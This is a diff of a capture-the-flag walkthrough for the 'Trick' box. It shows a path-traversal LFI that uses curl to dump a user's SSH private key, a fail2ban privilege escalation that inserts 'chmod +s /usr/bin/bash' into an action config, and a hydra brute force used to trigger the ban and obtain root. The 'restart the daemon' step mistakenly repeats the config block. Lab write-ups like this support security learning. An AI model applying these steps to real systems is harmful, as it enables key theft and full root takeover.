@@ -1,4 +1,4 @@
-# Nmap 
+## Nmap 
 ```bash
 22 - OpenSSH 7.9p1 Debian 10+deb10u2
 25 - Postfix
@@ -104,9 +104,100 @@ else{
 ```
 This points us to an LFI as the above can be evaded like this ..././..././..././  
 
-# LFI
+## LFI
 So we can now just dump michael's key, and get user access  
-```
+```bash
 curl 'http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa' -o michael.pem
 ```
 
+## Fail2Ban privesc
+It is imediately apparent that the privesc will be something with fail2ban  
+the makers of the box are hinting us to it in a few different ways  
+there is a fail2ban config file in michael's home folder 
+```bash
+-bash-5.0$ ls -la
+total 100
+drwxr-xr-x 15 michael michael  4096 Sep 17 16:33 .
+drwxr-xr-x  3 root    root     4096 May 25 13:28 ..
+lrwxrwxrwx  1 root    root        9 Apr 22 09:47 .bash_history -> /dev/null
+-rw-r--r--  1 michael michael   220 Apr 18  2019 .bash_logout
+-rw-r--r--  1 michael michael  3526 Apr 18  2019 .bashrc
+drwx------  9 michael michael  4096 May 11 21:09 .cache
+drwx------ 10 michael michael  4096 May 11 21:08 .config
+drwxr-xr-x  2 michael michael  4096 May 11 21:07 Desktop
+drwxr-xr-x  2 michael michael  4096 May 11 21:07 Documents
+drwxr-xr-x  2 michael michael  4096 May 11 21:07 Downloads
+drwx------  3 michael michael  4096 May 11 21:08 .gnupg
+-rw-------  1 michael michael  1256 May 25 13:09 .ICEauthority
+-rw-r--r--  1 michael michael  1536 Sep 17 14:22 iptables-multiport.conf
+drwx------  3 michael michael  4096 May 11 21:07 .local
+drwxr-xr-x  2 michael michael  4096 May 11 21:07 Music
+drwxr-xr-x  2 michael michael  4096 May 11 21:07 Pictures
+-rw-r--r--  1 michael michael   807 Apr 18  2019 .profile
+drwxr-xr-x  2 michael michael  4096 May 11 21:07 Public
+drwx------  2 michael michael  4096 May 24 17:25 .ssh
+drwxr-xr-x  2 michael michael  4096 May 11 21:07 Templates
+-rw-r-----  1 root    michael    33 Sep 17 01:51 user.txt
+drwxr-xr-x  2 michael michael  4096 May 11 21:07 Videos
+-rw-------  1 michael michael 12716 Sep 17 16:33 .viminfo
+```
+and he has access to restart fail2ban  
+```bash
+-bash-5.0$ sudo -l
+Matching Defaults entries for michael on trick:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User michael may run the following commands on trick:
+    (root) NOPASSWD: /etc/init.d/fail2ban restart
+```
+and also has write access in /etc/fail2ban/actions.d
+```bash
+-bash-5.0$ cd /etc/fail2ban/
+-bash-5.0$ ls -la
+total 76
+drwxr-xr-x   6 root root      4096 Sep 17 16:36 .
+drwxr-xr-x 126 root root     12288 Sep 17 01:51 ..
+drwxrwx---   2 root security  4096 Sep 17 16:36 action.d
+-rw-r--r--   1 root root      2334 Sep 17 16:36 fail2ban.conf
+drwxr-xr-x   2 root root      4096 Sep 17 16:36 fail2ban.d
+drwxr-xr-x   3 root root      4096 Sep 17 16:36 filter.d
+-rw-r--r--   1 root root     22908 Sep 17 16:36 jail.conf
+drwxr-xr-x   2 root root      4096 Sep 17 16:36 jail.d
+-rw-r--r--   1 root root       645 Sep 17 16:36 paths-arch.conf
+-rw-r--r--   1 root root      2827 Sep 17 16:36 paths-common.conf
+-rw-r--r--   1 root root       573 Sep 17 16:36 paths-debian.conf
+-rw-r--r--   1 root root       738 Sep 17 16:36 paths-opensuse.conf
+```
+a quick google search for "fail2ban privesc" an we know we can execute arbitrary command with this  
+let's try to make a bash suid  
+```bash
+cp /etc/fail2ban/action.d/iptables-multiport.conf iptables-multiport.conf
+```
+adding the chmod suid into the actionban command  
+```bash
+actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+            chmod +s /usr/bin/bash
+```
+and placing the file back in action.d  
+```bash
+rm -rf /etc/fail2ban/action.d/iptables-multiport.conf
+cp iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
+```
+then restarting the daemon  
+```bash
+actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
+            chmod +s /usr/bin/bash
+```
+Now of course we need to trigger the ban, lets do a bruteforce attach with hydra  
+```bash
+hydra ssh://trick.htb -l root -P /usr/share/wordlists/rockyou.txt
+```
+and we're in  
+```bash
+ls -la /usr/bin/bash
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /usr/bin/bash
+bash -p
+bash-5.0# wc -c /root/root.txt
+33 /root/root.txt
+```
